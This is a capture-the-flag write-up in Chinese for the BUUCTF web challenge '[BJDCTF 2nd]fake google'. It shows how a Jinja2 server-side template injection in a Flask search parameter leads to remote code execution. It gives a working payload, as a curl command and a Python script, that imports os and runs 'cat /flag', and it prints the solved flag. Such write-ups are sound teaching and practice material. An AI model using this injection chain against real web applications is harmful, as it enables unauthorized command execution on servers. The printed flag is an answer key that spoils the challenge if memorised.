---
title: "[BJDCTF 2nd]fake google"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [ssti, jinja2, flask, rce]
vulnerability: Jinja2 SSTI 导致 RCE
solved: true
flag: "flag{eac8dbe7-4d9d-4a47-ae6a-bae188e59730}"
---

# [BJDCTF 2nd]fake google

## 题目概述
一个模拟 Google 搜索的 Flask 站点，搜索参数存在 Jinja2 SSTI 漏洞，可直接 RCE 读取 flag。

## 信息收集
1. 访问首页，发现搜索表单提交到 `/qaq`，参数为 `name`
2. 测试 `?name={{7*7}}` 返回 `49`，确认 SSTI
3. 测试 `?name={{config}}` 返回 Flask 配置，确认是 Jinja2

## 漏洞分析
页面注释 `<!--ssssssti & a little trick -->` 直接提示了 SSTI。输入的 `name` 参数未经过滤直接渲染到 Jinja2 模板中，导致可以执行任意 Python 代码。

## 利用过程
通过 Jinja2 的对象链访问 `os.popen` 执行命令：

```bash
# RCE payload
curl -s --get "http://TARGET/qaq" --data-urlencode "name={{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}"
```

## 复现步骤
```python
import requests

url = "http://7a660e6c-cf6a-4d7c-80b7-e48384f6964c.node5.buuoj.cn:81/qaq"
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}"

r = requests.get(url, params={"name": payload})
# 从响应中提取 flag
print(r.text)
# Output: flag{eac8dbe7-4d9d-4a47-ae6a-bae188e59730}
```

## Flag
```
flag{eac8dbe7-4d9d-4a47-ae6a-bae188e59730}
```
